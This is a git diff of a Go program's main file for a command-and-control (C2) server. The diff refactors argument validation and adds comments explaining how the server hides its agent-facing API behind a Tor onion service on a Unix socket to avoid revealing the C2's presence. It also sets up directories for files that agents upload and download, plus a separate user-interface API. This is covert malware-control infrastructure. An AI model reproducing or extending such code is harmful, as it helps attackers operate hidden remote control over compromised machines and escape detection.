@@ -5,65 +5,84 @@ import (
 	"api/ctrl/apictrl"
 	"api/ctrl/c2ctrl"
 	"api/db"
-	"flag"
 	"fmt"
 	"log"
 	"net"
 	"net/http"
 	"os"
-	"strings"
 )
 
 func main() {
-	flag.Parse()
+	// Assures command line arguments are valid enough to run the program.
+	// Exits if not.
+	config.Validate()
 
-	if len(*config.ApiSockPath) == 0 {
-		fmt.Println("api sock path is not specified")
-		os.Exit(1)
-	}
-	if !strings.HasSuffix(*config.ApiSockPath, ".sock") {
-		fmt.Println("api sock path must have '.sock' suffix")
-		os.Exit(1)
-	}
-	if len(*config.ApiSecretKey) < 16 {
-		fmt.Println("api key too insecure or not provided, must be greater than 16 chars")
-		os.Exit(1)
-	}
-
+	// Clean up previous Unix socket of the API, just in case it's there.
 	os.RemoveAll(*config.ApiSockPath)
+
+	// Create directories used for storing files uploaded & downloaded
+	// by agents.
 	os.MkdirAll(*config.UploadsDirectoryPath, 0777)
 	os.MkdirAll(*config.DownloadsDirectoryPath, 0777)
 
+	// "torrc" configuration file contains instructions for how Tor should
+	// behave. In our case we use it in order to define our onion service.
+	// https://community.torproject.org/onion-services/overview
+	// https://support.torproject.org/tbb/tbb-editing-torrc
 	if err := writeTorrcConfig(config.ApiSockPath, config.OnionServicePath); err != nil {
 		fmt.Println("error: writeTorrcConfig:", err)
 		os.Exit(1)
 	}
 
+	// Initialize an instance of SQLite database.
 	if err := db.Init(*config.DbPath); err != nil {
 		fmt.Println("error: writeTorrcConfig:", err)
 		os.Exit(1)
 	}
 
 	go func() {
+		// Starts the command and control web API to which agents connect to.
 		if err := startOnionService(config.ApiSockPath); err != nil {
 			fmt.Println("error: startOnionService:", err)
 			os.Exit(1)
 		}
 	}()
 
+	// Starts a web API used by user interface. The two APIs are isolated in
+	// this manner because we don't wish a potentially vulnerable endpoint
+	// to be publicly exposed on the onion service. Isolation is the key to
+	// security of any system.
 	if err := startUserFacingService(config.ApiHost); err != nil {
 		fmt.Println("error: startUserFacingService:", err)
 		os.Exit(1)
 	}
 }
 
+// writeTorrcConfig writes torrc file onto disk.
 func writeTorrcConfig(apiSockPath, onionServiceDirPath *string) (err error) {
+	// Specifies directory where our onion service would be stored.
+	// Files like hostname, private key, and other important stuff.
 	torrc := "HiddenServiceDir " + *onionServiceDirPath
+
+	// Specifies on which virtual port our service would be listening on.
+	// Default is 80, however, that doesn't mean it's not secure (as a
+	// lot of people associate port 443 with encrypted connection I
+	// wish to clarify something). Onion services are end to end encrypted.
+	// Onion domain itself is an encoded public key, meaning that if you
+	// have a correct onion domain you have guarantees to be connected
+	// to a correct server.
+	//
+	// In our case the Command and Control (C2) web API is listening
+	// locally on a Unix socket in order to avoid leaking the C2's
+	// presence.
+	// https://en.wikipedia.org/wiki/Unix_domain_socket
 	torrc += "\nHiddenServicePort 80 unix:" + *apiSockPath
 
 	return os.WriteFile("torrc", []byte(torrc), 0666)
 }
 
+// startUserFacingService starts an API used for integration of
+// user interfaces.
 func startUserFacingService(apiHost *string) (err error) {
 	router := http.NewServeMux()
 
@@ -85,6 +104,7 @@ func startUserFacingService(apiHost *string) (err error) {
 	return nil
 }
 
+// startOnionService starts command and control API (listening on Unix socket).
 func startOnionService(apiSockPath *string) (err error) {
 	router := http.NewServeMux()
 
